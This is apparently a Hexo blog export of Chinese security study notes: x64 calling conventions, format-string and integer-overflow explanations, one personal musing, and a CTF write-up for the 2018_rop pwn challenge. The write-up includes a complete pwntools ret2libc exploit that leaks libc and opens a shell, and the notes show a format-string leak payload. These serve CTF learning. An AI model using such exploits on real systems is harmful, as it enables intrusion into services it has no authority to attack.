<h3 id="参数传递的不同"><a href="#参数传递的不同" class="headerlink" title="参数传递的不同"></a>参数传递的不同</h3><pre><code>6个寄存器用来传递参数（见前文）
剩下的寄存器按照之前的方式传递（不过是与rsp相关了，ebp不再作为栈帧指针，并且从rsp开始第7个参数，rsp+8开始第8个，以此类推）
调用时，rsp向下移动8位（存入返回地址），寄存器参数无影响，第7个及之后的参数现在则是从rsp+8开始第7个，rsp+16开始第8个，以此类推
</code></pre>
<h3 id="栈帧的不同"><a href="#栈帧的不同" class="headerlink" title="栈帧的不同"></a>栈帧的不同</h3><p>很多情况下不再需要栈帧，比如在没有调用别的函数，且寄存器足以存储参数，那么就只需要存储返回地址即可。<br>需要栈帧的情况：</p>
<pre><code>本地变量太多，寄存器不够
一些本地变量是数组或结构体
函数使用了取地址操作符来计算一个本地变量的地址
函数必须用栈传送一些参数给另外一个函数
函数需要保存一些由被调用者存储的寄存器的状态（以便于恢复）
</code></pre>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn、笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>铁人三项(第五赛区)_2018_rop</title>
    <url>/2021/06/25/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>查看保护机制，开了NX，32位</p>
<p><img src="/img/image-20210625101308461.png" alt="image-20210625101308461"></p>
<p>IDA打开，shift+F12查找字符串，没有发现/bin/sh</p>
<p><img src="/img/image-20210625101526643.png" alt="image-20210625101526643"></p>
<p>再查看main函数中，东西不多，挨个查看里面的函数，发现vulnerable_function();函数里面有蹊跷</p>
<p><img src="/img/image-20210625101817170.png" alt="image-20210625101817170"></p>
<p>这里发现漏洞，read的buf长度为0x100，而写入的参数大小是0x88，能溢出0x78个长度，足够构造rop攻击 </p>
<p><img src="/img/image-20210625101909489.png" alt="image-20210625101909489"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>先通过write函数地址泄露出libc版本，然后再在libc版本里算出system函数和/bin/sh的地址，最后通过栈溢出覆盖返回地址填上system(‘/bin/sh’)，夺权。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28086</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>脚本一跑，cat flag就得到flag了</p>
<p><img src="/img/image-20210625105710279.png" alt="image-20210625105710279"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>飞蓬大将军</title>
    <url>/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</url>
    <content><![CDATA[<span id="more"></span>
<h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p>
<p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>
]]></content>
      <categories>
        <category>日常闲话</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2021/07/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>格式化字符串漏洞是<code>PWN</code>题常见的考察点，仅次于栈溢出漏洞。漏洞原因：程序使用了格式化字符串作为参数，并且格式化字符串为用户可控。其中触发格式化字符串漏洞函数主要是<code>printf</code>、<code>sprintf</code>、<code>fprintf</code>、<code>prin</code>等C库中<code>print</code>家族的函数</p>
<h3 id="0x01-格式化字符串介绍"><a href="#0x01-格式化字符串介绍" class="headerlink" title="0x01 格式化字符串介绍"></a>0x01 格式化字符串介绍</h3><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">printf（<span class="string">&quot;格式化字符串&quot;</span>,参数...)</span><br></pre></td></tr></table></figure>

<p>该<code>printf</code>函数的第一个参数是由格式化说明符与字符串组成，用来规定参数用什么格式输出内容。</p>
<p>格式化说明符：</p>
<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">d</span></span> - 十进制 - 输出十进制整数</span><br><span class="line"><span class="tag">%<span class="selector-tag">s</span></span> - 字符串 - 从内存中读取字符串</span><br><span class="line"><span class="tag">%<span class="selector-tag">x</span></span> - 十六进制 - 输出十六进制数</span><br><span class="line"><span class="tag">%<span class="selector-tag">c</span></span> - 字符 - 输出字符</span><br><span class="line"><span class="tag">%<span class="selector-tag">p</span></span> - 指针 - 指针地址</span><br><span class="line"><span class="tag">%<span class="selector-tag">n</span></span> - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;My name is %s&quot;</span>,<span class="string">&quot;Ezreal&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用以后会显示：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">My <span class="built_in">name</span> <span class="keyword">is</span> Ezreal</span><br></pre></td></tr></table></figure>

<p>特别要注意的是<code>%n</code>这个格式化字符串，它的功能是将<code>%n</code>之前打印出来的字符个数，赋值给一个变量。例如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = <span class="number">0</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the use of %n&quot;</span>, &amp;c);<span class="function">sss</span></span><br><span class="line"><span class="function">    <span class="title">printf</span><span class="params">(<span class="string">&quot;%d\n&quot;</span>, c)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用以后会显示：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">the <span class="keyword">use</span> of <span class="number">11</span></span><br></pre></td></tr></table></figure>

<h3 id="0x02-漏洞形成原因"><a href="#0x02-漏洞形成原因" class="headerlink" title="0x02 漏洞形成原因"></a>0x02 漏洞形成原因</h3><p>1、函数用法：</p>
<p>正常的<code>printf</code>用法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写程序时要规定字符串的格式化说明符，规定参数的输出类型</p>
<p>错误的<code>printf</code>写法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">  <span class="built_in">printf</span>(str);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞形成原因：程序将格式化字符串的输入权交给用户，printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。所以没有参数，代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。示例程序：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们的输入为:</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">AAAA<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span>,<span class="built_in">%x</span></span><br></pre></td></tr></table></figure>

<p>程序的输出为：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">AAAA61fe4c</span>,<span class="number">61</span>ffcc,<span class="number">76</span>e<span class="number">4</span>d<span class="number">250</span>,<span class="number">70734</span>fbf,fffffffe,<span class="number">76</span>e<span class="number">473</span>da,<span class="number">41414141</span>,<span class="number">252</span>c<span class="number">7825</span>,<span class="number">78252</span>c<span class="number">78</span>,<span class="number">2</span>c<span class="number">78252</span>c,<span class="number">252</span>c<span class="number">7825</span></span><br></pre></td></tr></table></figure>

<p>成功打印出地址</p>
<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>对于格式化字符串漏洞的主要利用有：使程序崩溃、栈数据泄露、任意地址内存泄露、栈数据覆盖、任意地址内存覆盖。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn、笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>整数安全漏洞</title>
    <url>/2021/07/23/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引，就会产生潜在的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出发生之后，很难立即被察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出。</p>
<p>关于整数的异常情况主要有三种：<br>(1) 溢出，只有有符号数才会发生溢出。有符号数的最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出。溢出标指OF可检测有符号数的溢出；<br>(2) 回绕，无符号数0-1时会变成最大的数，如1字节的无符号数会变成255，而255+1会变成最小数0.进位标志CF可检测无符号数的回绕；<br>(3) 截断，将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断</p>
<h3 id="漏洞多发函数"><a href="#漏洞多发函数" class="headerlink" title="漏洞多发函数"></a>漏洞多发函数</h3><p>整数溢出要配合其他类型的缺陷才能有用，下面的两个函数都有一个size_t类型的参数（size_t是无符号整数类型的sizeof()的结果），常常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line">void *memcpy(void *dest,const void *src,size_t n);</span><br></pre></td></tr></table></figure>

<p>memcpy()函数将src所指向的字符串中以src地址开始的前n个字节复制到dest所指的数组中，并返回dest。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line">char *strncpy(char *dest, const char *src,size_t n);</span><br></pre></td></tr></table></figure>

<p>strncpy()函数从源src所指的内存地址的起始位置开始复制n个字节到目标dest所指的内存地址的起始位置中。</p>
<p>两个函数中都有一个类型为size_t的参数，它是无符号整型的sizeof运算符的结果。</p>
<pre><code>typedef unsigned int size_t;    h
</code></pre>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn、笔记</tag>
      </tags>
  </entry>
</search>
